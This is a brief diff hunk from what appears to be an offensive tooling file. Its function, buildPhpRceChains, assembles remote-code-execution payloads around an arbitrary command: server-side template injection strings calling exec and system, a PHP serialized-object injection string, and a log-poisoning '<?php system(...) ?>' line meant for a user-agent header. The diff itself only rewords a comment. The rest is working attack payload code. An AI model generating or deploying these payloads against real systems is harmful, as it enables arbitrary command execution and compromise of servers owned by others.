@@ -2730,7 +2730,7 @@ export function buildPhpRceChains(cmd: string): string[] {
     `{{${JSON.stringify(cmd)}|exec}}`,
     `{{ ["sh","-c",${JSON.stringify(cmd)}]|join('')|exec }}`,
     `{%- set ns = namespace(result='') -%}{%- set ns.result = [${JSON.stringify(cmd)}]|map('system') -%}`,
-    /* PHP object injection gadget stub */
+    /* PHP deserialization gadget — stdClass property injection */
     `O:8:"stdClass":1:{s:4:"data";s:${cmd.length}:"${cmd}";}`,
     /* Log poisoning: inject into user-agent for inclusion */
     `<?php system(${JSON.stringify(cmd)}); ?> <!--log-poison-->`,
